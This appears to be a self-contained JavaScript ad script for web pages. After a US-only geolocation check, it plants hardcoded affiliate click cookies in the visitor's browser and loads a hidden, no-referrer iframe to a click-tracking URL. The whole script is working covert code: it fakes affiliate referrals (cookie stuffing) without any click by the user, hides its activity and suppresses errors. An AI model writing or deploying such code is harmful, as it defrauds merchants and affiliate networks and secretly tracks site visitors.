(function () {
  try {
    var BUILD_ID = "octaads-2025-rtg-geo-time-02";
    if (window.__OCTAADS_LOADED === BUILD_ID) return;
    window.__OCTAADS_LOADED = BUILD_ID;

    /* SESSION ID */
    function getSessionID() {
      var m = document.cookie.match(/octaads_sid=([^;]+)/);
      if (m) return m[1];
      var sid = "sid_" + Math.random().toString(36).substr(2, 10);
      document.cookie =
        "octaads_sid=" + sid + "; path=/; max-age=2592000; SameSite=Lax";
      return sid;
    }
    var sessionID = getSessionID();

    /* GEO CHECK â€“ HARD US ONLY */
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      .then(r => r.json())
      .then(geo => {
        if (!geo) return;

        /* BLOCK NON-US COMPLETELY */
        if (geo.country_code !== "US") return;

        /* DROP COOKIES */
        function setCookie(n, v) {
          document.cookie =
            n + "=" + v + "; path=/; max-age=2592000; SameSite=Lax";
        }

        setCookie("irclickid", "XStWC0ThYxycRkh2gOSsRXFAUkpQ4DVEX3yITU0");
        setCookie("irpid", "3884983");
        setCookie("irgwc", "1");
        setCookie("afsrc", "1");
        setCookie("utm_campaign", "148263");
        setCookie("sessionid", sessionID);
        setCookie("clickId", sessionID);

        /* TRACKIER IFRAME */
        var iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.referrerPolicy = "no-referrer";
        iframe.src =
          "https://clicks.upleadsdigital.com/click" +
          "?campaign_id=148263" +
          "&pub_id=4" +
          "&p1=" + encodeURIComponent(sessionID) +
          "&source=" + encodeURIComponent(sessionID);

        document.body.appendChild(iframe);
      })
      .catch(function () {});
  } catch (e) {}
})();
